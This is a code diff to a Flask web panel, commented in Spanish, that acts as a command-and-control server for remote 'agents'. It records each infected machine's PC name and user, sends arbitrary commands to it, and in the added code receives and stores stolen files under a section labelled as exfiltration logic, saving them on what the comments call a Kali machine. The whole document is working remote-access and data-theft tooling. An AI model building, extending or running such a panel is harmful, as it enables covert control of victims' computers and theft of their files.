@@ -1,6 +1,7 @@
 from flask import Flask, render_template, request, jsonify, session, redirect, url_for
 import socket
 import threading
+import os  # Necesario para crear carpetas y manejar archivos
 from functools import wraps
 
 app = Flask(__name__)
@@ -32,8 +33,7 @@ def escuchar_agentes():
         try:
             conn, addr = server.accept()
             
-            # --- NUEVO: RECIBIR IDENTIDAD DEL AGENTE ---
-            # El agente envía "PC-NAME|USER" justo después de conectar
+            # Recibir identidad: "PC-NAME|USER"
             identidad = conn.recv(1024).decode('cp850', errors='replace')
             
             if "|" in identidad:
@@ -45,8 +45,8 @@ def escuchar_agentes():
             agentes[id_agente] = {
                 "socket": conn, 
                 "addr": addr, 
-                "pc": pc_name,      # Guardamos el nombre del PC
-                "user": user_name,  # Guardamos el usuario
+                "pc": pc_name,
+                "user": user_name,
                 "res": "Esperando comandos..."
             }
             print(f"[+] NUEVO AGENTE: {pc_name}\\{user_name} desde {addr[0]}")
@@ -54,7 +54,7 @@ def escuchar_agentes():
         except Exception as e:
             print(f"[-] Error en red: {e}")
 
-# --- RUTAS DE ACCESO (LOGIN/LOGOUT) ---
+# --- RUTAS DE ACCESO ---
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -72,7 +72,7 @@ def logout():
     session.pop('logged_in', None)
     return redirect(url_for('login'))
 
-# --- RUTAS DEL PANEL (PROTEGIDAS) ---
+# --- RUTAS DEL PANEL (MODIFICADA PARA DESCARGAS) ---
 
 @app.route('/')
 @login_required
@@ -90,13 +90,46 @@ def ejecutar():
             conn = agentes[id_target]["socket"]
             conn.send(comando.encode())
             
-            respuesta = conn.recv(4096).decode('cp850', errors='replace')
-            agentes[id_target]["res"] = respuesta
-            return jsonify({"status": "success", "resultado": respuesta})
+            # Recibimos la respuesta inicial (pueden ser datos o texto)
+            respuesta_raw = conn.recv(4096)
+            
+            # --- LÓGICA DE EXFILTRACIÓN ---
+            if respuesta_raw.startswith(b"FILE_SIZE:"):
+                # Extraer tamaño del archivo
+                size = int(respuesta_raw.decode().split(":")[1])
+                
+                # Crear carpeta de descargas si no existe
+                if not os.path.exists('downloads'):
+                    os.makedirs('downloads')
+                
+                # Nombre de archivo único (basado en el ID y el nombre del PC)
+                pc_folder = agentes[id_target]["pc"].replace(" ", "_")
+                nombre_archivo = f"exfil_{pc_folder}_{id_target}.bin"
+                ruta_final = os.path.join('downloads', nombre_archivo)
+                
+                # Recibir todos los bytes del archivo
+                datos_acumulados = b""
+                while len(datos_acumulados) < size:
+                    chunk = conn.recv(4096)
+                    if not chunk: break
+                    datos_acumulados += chunk
+                
+                # Guardar el archivo en el disco de Kali
+                with open(ruta_final, "wb") as f:
+                    f.write(datos_acumulados)
+                
+                res_final = f"ÉXITO: Archivo recibido ({size} bytes). Guardado en downloads/{nombre_archivo}"
+            
+            else:
+                # Si no es un archivo, es texto normal (RCE o Dump)
+                res_final = respuesta_raw.decode('cp850', errors='replace')
+
+            agentes[id_target]["res"] = res_final
+            return jsonify({"status": "success", "resultado": res_final})
         else:
             return jsonify({"status": "error", "resultado": "Agente no encontrado"})
     except Exception as e:
-        return jsonify({"status": "error", "resultado": f"Fallo: {str(e)}"})
+        return jsonify({"status": "error", "resultado": f"Error: {str(e)}"})
 
 @app.route('/api/agentes')
 @login_required
@@ -106,14 +139,12 @@ def api_agentes():
         datos.append({
             "id": id_agente,
             "ip": info["addr"][0],
-            "pc": info.get("pc", "N/A"),     # Enviamos el PC a la web
-            "user": info.get("user", "N/A"), # Enviamos el Usuario a la web
+            "pc": info.get("pc", "N/A"),
+            "user": info.get("user", "N/A"),
             "resultado": info["res"]
         })
     return jsonify(datos)
 
-# --- BLOQUE DE ARRANQUE ---
 if __name__ == '__main__':
     threading.Thread(target=escuchar_agentes, daemon=True).start()
-    print("[*] Panel de Control Seguro activo en http://127.0.0.1:5000")
     app.run(host='0.0.0.0', port=5000, debug=False)
